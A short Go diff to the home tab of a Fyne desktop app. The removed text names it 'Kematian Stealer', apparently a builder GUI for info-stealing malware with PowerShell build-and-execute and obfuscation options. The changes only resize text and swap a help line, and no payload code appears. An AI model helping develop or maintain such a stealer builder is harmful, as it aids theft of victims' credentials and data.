@@ -16,11 +16,11 @@ func GetHomeTab(a fyne.App) *fyne.Container {
 
 	mainTitle := canvas.NewText("Home", blue)
 	mainTitle.Alignment = fyne.TextAlignCenter
-	mainTitle.TextSize = 18
+	mainTitle.TextSize = 32
 
-	textBox := canvas.NewText("If Kematian Stealer doesn't work, go into the powershell tab and press on debug then build and execute then find the error then post it on the Github.", blue)
+	textBox := canvas.NewText("Made with love ❌ code ✔️", blue)
 	textBox.Alignment = fyne.TextAlignCenter
-	textBox.TextSize = 12
+	textBox.TextSize = 18
 
 	//basically just do nothing when the checkbox is checked
 	//obfuscateCheckBox := widget.NewCheck("Obfuscate", func(_ bool) {})
